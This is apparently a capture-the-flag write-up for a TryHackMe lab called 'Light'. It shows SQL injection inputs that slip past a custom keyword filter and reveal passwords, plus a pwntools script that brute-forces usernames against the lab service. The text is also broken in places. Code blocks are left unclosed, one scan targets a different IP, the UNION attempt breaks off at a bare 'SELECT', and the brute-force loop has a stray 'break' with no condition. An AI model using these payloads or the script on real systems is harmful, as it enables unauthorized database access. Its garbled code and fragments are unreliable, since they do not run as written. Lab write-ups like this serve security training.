# **Easy - Welcome to the Light database application!**
https://tryhackme.com/room/lightroom

I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using ``nc 10.10.22.91 1337``
You can use the username smokey in order to get started.

# Reconnaissance
Target: ``10.10.22.91``

We connect with
``nc 10.10.22.91 1337``
and enter username smokey gives us 

```
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```
Only SSH and the custom 1337 service
```
sudo nmap -p- 10.10.73.73

# Findings
- We try some obious admin credentails, no luck.
- We try the username and password with SSH, no luck.
- We hit it with a large username list, we get users like alice although no admin. included the script below.
- We hit with some SQLi and find there is some custom filtering, the most likely entry

```
Please enter your username: ``' or 1=1 --``
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```
# Exploiting Findings

Find some weakness in the filtering we remove -- to find it by-passes filter but we get an error, 
```
Please enter your username: ' or 1=1 
Error: unrecognized token: "' LIMIT 30"

Please enter your username: ' or '1'='1' 
Error: unrecognized token: "'1'' LIMIT 30"
```
Ahh get around the sytax error with
```
Please enter your username: ' or '1'='1  
Password: tF8tj2o94WE4LKC
```

Now what SQLtype? more filtering to overcome 
```
Please enter your username: ' UNION SELECT @@version'
Ahh there is a word in there I don't like :( 
```
Union Select Looks to bypass filters, 

```
Please enter your username: SELECT

# Summary 
Nice room to show why custom frameworks for preventing SQLi is a bad idea, took me a bit to long to start with SQLi and was focused on Bruteforcing. Including bruteforcing script below as while it didn't work it's a good showcase for pwntools 


# failed exploration 

## Setting up pwntools for kali 
```
mkdir /home/kali/pwntools
python3 -m venv /home/kali/pwntools
home/kali/pwntools/bin/pip install pwntools pwntools\nsource /home/kali/pwntools/bin/activate

```
## bruteforce script
``nano lightbrute.py``

```
from pwn import *
import requests

# Target details
host = "10.10.22.91"
port = 1337
username_url = "https://raw.githubusercontent.com/jeanphorn/wordlist/refs/heads/master/usernames.txt"

# Download the username list
print("[*] Downloading username list...")
try:
    response = requests.get(username_url, timeout=10)
    response.raise_for_status()
    usernames = response.text.splitlines()
    print(f"[+] Loaded {len(usernames)} usernames.")
except requests.RequestException as e:
    print(f"[!] Failed to download usernames: {e}")
    exit(1)

# Start a single session
print(f"[*] Connecting to {host}:{port}...")
conn = remote(host, port, timeout=5)

# Read initial welcome message
welcome_message = conn.recvuntil(b"Please enter your username:").decode().strip()
print(f"[+] Received: {welcome_message}")

# Try each username in the same session
for username in usernames:
    print(f"[*] Trying username: {username}")
    
    conn.sendline(username)  # Send the username
    response = conn.recvuntil(b"Please enter your username:").decode().strip()  # Read the response

        break  # Stop once a valid username is found
